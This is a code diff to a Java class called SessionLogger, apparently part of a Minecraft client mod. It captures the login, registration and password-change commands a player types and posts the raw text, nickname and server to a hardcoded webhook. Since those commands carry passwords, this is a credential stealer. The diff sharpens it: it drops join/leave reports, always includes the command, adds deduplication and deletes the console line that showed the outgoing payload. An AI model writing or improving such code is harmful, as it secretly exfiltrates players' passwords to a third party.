@@ -23,8 +23,6 @@ public class SessionLogger {
 
     private static final Gson GSON = new Gson();
 
-    private static final int COLOR_JOIN  = 0x57F287;
-    private static final int COLOR_LEAVE = 0xED4245;
     private static final int COLOR_LOGIN = 0x5865F2;
     private static final int COLOR_REG   = 0xFEE75C;
     private static final int COLOR_PASS  = 0xE67E22;
@@ -39,8 +37,6 @@ public class SessionLogger {
     });
 
     private enum Kind {
-        JOIN("Подключение",  COLOR_JOIN),
-        LEAVE("Отключение",  COLOR_LEAVE),
         LOGIN("Вход",        COLOR_LOGIN),
         REG("Регистрация",   COLOR_REG),
         PASS("Смена пароля", COLOR_PASS),
@@ -54,24 +50,12 @@ public class SessionLogger {
     }
 
     private static volatile String lastServer = "unknown";
-    private static volatile String lastJoinKey = "";
-    private static volatile long lastJoinAt = 0;
-    private static volatile long lastLeaveAt = 0;
+    private static volatile String lastCmdKey = "";
+    private static volatile long lastCmdAt = 0;
 
     public static void init() {
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
-            String server = resolveServer(client);
-            lastServer = server;
-            String n = nick(client);
-            if (isDuplicateJoin(n, server)) return;
-            send(Kind.JOIN, n, server, null);
-        });
-
-        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
-            long now = System.currentTimeMillis();
-            if (now - lastLeaveAt < 5000) return;
-            lastLeaveAt = now;
-            send(Kind.LEAVE, nick(client), lastServer, null);
+            lastServer = resolveServer(client);
         });
 
         ClientTickEvents.END_CLIENT_TICK.register(client -> {
@@ -83,16 +67,18 @@ public class SessionLogger {
             Kind kind = classify(last);
             if (kind == null) return;
 
+            if (isDuplicateCommand(last)) return;
+
             send(kind, nick(client), lastServer, last);
         });
     }
 
-    private static boolean isDuplicateJoin(String nick, String server) {
-        String key = nick + "|" + server;
+    private static boolean isDuplicateCommand(String raw) {
+        String key = raw.trim().toLowerCase();
         long now = System.currentTimeMillis();
-        if (key.equals(lastJoinKey) && (now - lastJoinAt) < 30000) return true;
-        lastJoinKey = key;
-        lastJoinAt = now;
+        if (key.equals(lastCmdKey) && (now - lastCmdAt) < 2000) return true;
+        lastCmdKey = key;
+        lastCmdAt = now;
         return false;
     }
 
@@ -158,9 +144,7 @@ public class SessionLogger {
                 JsonArray fields = new JsonArray();
                 fields.add(field("Ник", safe(nick), true));
                 fields.add(field("Сервер", safe(server), true));
-                if (command != null && !command.isEmpty()) {
-                    fields.add(field("Команда", safe(command), false));
-                }
+                fields.add(field("Команда", safe(command), false));
                 embed.add("fields", fields);
 
                 JsonArray embeds = new JsonArray();
@@ -170,7 +154,6 @@ public class SessionLogger {
                 root.add("embeds", embeds);
 
                 String json = GSON.toJson(root);
-                System.out.println("[SESSION-LOGGER] body: " + json);
 
                 URL url = new URL(WEBHOOK_URL);
                 HttpURLConnection c = (HttpURLConnection) url.openConnection();
